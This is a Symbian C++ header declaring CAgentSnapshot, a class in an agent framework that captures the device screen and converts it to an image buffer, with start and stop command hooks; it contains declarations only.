/*
 * AgentSnapshot.h
 *
 *  Created on: 05/ago/2010
 *      Author: Giovanna
 */

#ifndef AGENTSNAPSHOT_H_
#define AGENTSNAPSHOT_H_

// INCLUDES
#include <W32STD.H>
#include <e32std.h>
#include <e32base.h>

#include "AbstractAgent.h"
#include "AdditionalDataStructs.h"

// CLASS DECLARATION

/**
 *  CAgentSnapshot
 * 
 */
class CAgentSnapshot : public CAbstractAgent
	{
public:
	// Constructors and destructor

	/**
	 * Destructor.
	 */
	~CAgentSnapshot();

	/**
	 * Two-phased constructor.
	 */
	static CAgentSnapshot* NewL(const TDesC8& params);

	/**
	 * Two-phased constructor.
	 */
	static CAgentSnapshot* NewLC(const TDesC8& params);

protected:
	// From AbstractQueueEndPoint
	virtual void StartAgentCmdL();
	virtual void StopAgentCmdL();
		
private:

    // Capture the image into mbm format
    void DoCaptureL();
    
    // Convert the image into the required format and put it into a buffer
    HBufC8* GetImageBufferL();

	/**
	 * Constructor for performing 1st stage construction
	 */
	CAgentSnapshot();
	

	/**
	 * EPOC default constructor for performing 2nd stage construction
	 */
	void ConstructL(const TDesC8& params);

private:
	RWsSession	iWsSession;
	CWsScreenDevice* iScreenDevice;
	CFbsBitmap*          iBitmap;
	TBool   iCapturedScreen;
	TInt    iQuality;
	};


#endif /* AGENTSNAPSHOT_H_ */
